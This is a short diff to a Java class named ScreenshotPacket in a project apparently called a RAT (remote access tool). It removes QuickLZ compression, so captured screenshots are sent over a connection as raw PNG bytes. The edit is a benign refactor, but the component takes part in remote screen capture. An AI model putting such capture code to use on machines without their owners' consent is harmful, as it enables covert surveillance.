@@ -7,7 +7,6 @@ import de.sogomn.engine.Screen.ResizeBehavior;
 import de.sogomn.engine.util.ImageUtils;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.util.FrameEncoder;
-import de.sogomn.rat.util.QuickLZ;
 
 public final class ScreenshotPacket extends AbstractPingPongPacket {
 	
@@ -29,8 +28,7 @@ public final class ScreenshotPacket extends AbstractPingPongPacket {
 	
 	@Override
 	protected void sendData(final ActiveConnection connection) {
-		byte[] data = ImageUtils.toByteArray(image, "PNG");
-		data = QuickLZ.compress(data);
+		final byte[] data = ImageUtils.toByteArray(image, "PNG");
 		
 		connection.writeInt(data.length);
 		connection.write(data);
@@ -44,9 +42,9 @@ public final class ScreenshotPacket extends AbstractPingPongPacket {
 	@Override
 	protected void receiveData(final ActiveConnection connection) {
 		final int length = connection.readInt();
-		byte[] data = new byte[length];
+		final byte[] data = new byte[length];
+		
 		connection.read(data);
-		data = QuickLZ.decompress(data);
 		
 		image = ImageUtils.toImage(data);
 		
